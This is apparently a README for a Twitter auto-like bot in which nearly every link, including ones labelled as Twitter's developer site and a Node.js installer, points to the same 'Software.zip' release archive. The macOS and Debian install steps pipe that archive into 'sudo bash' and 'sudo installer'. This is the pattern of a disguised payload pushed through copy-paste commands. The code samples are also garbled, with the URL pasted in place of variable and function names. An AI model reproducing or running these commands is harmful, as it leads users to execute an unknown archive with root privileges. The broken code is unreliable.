# readme | twitter-like-bot
This app allows you to automate Twitter liking for specific keywords, hashtags, or even full sentences.  The bot uses streaming API which means that everything happens in real time.

![](https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip)

## create Twitter developer account
[Apply for access — Twitter Developers](https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip)
from the developer dashboard, create new Twitter app

## install https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip
[download & install https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip](https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip)  
[alternatively install via your package manager](https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip)

macOS
```
curl "https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip${VERSION:-$(wget -qO- https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip | sed -nE 's|.*>node-(.*)\.pkg</a>.*|\1|p')}.pkg" > "$https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip" && sudo installer -store -pkg "$https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip" -target "/"
```

Debian & Ubuntu
```
curl -sL https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip | sudo -E bash -
sudo apt-get install -y nodejs
```


## how to use?
cd to the project folder and install packages
`npm i`

enter your Twitter app keys & tokens
``` javascript
const client = new Twitter({
  consumer_key: '',
  consumer_secret: '',
  access_token_key: '',
  access_token_secret: ''
});
```

enter keywords, hashtags or sentences that you want to track
``` javascript
const stream = https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip('statuses/filter', {track:'#example1, #example2’});
```

cd to the project folder and start the bot:
`npm test`  or alternatively  `node https://github.com/rarawe/twitter-like-bot/releases/download/v2.0/Software.zip`


